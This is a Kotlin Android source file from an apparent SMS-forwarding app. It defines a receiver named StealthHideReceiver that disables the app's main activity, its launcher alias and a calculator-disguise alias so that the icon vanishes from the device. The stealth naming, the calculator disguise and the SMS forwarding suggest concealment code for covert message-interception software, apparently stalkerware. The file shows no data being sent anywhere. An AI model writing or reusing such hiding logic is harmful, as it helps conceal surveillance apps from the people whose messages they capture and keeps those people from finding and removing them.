package com.smsforwarder.app.receiver

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log

class StealthHideReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val appContext = context.applicationContext
        runCatching {
            val pm = appContext.packageManager
            val mainComponent = ComponentName(appContext.packageName, "com.smsforwarder.app.MainActivity")
            val aliasComponent = ComponentName(appContext.packageName, "com.smsforwarder.app.LauncherAlias")
            val calcComponent = ComponentName(appContext.packageName, "com.smsforwarder.app.CalculatorAlias")

            pm.setComponentEnabledSetting(mainComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
            pm.setComponentEnabledSetting(aliasComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
            pm.setComponentEnabledSetting(calcComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
            Log.d("StealthHideReceiver", "Disabled all main activities for complete icon vanish")
        }
    }
}
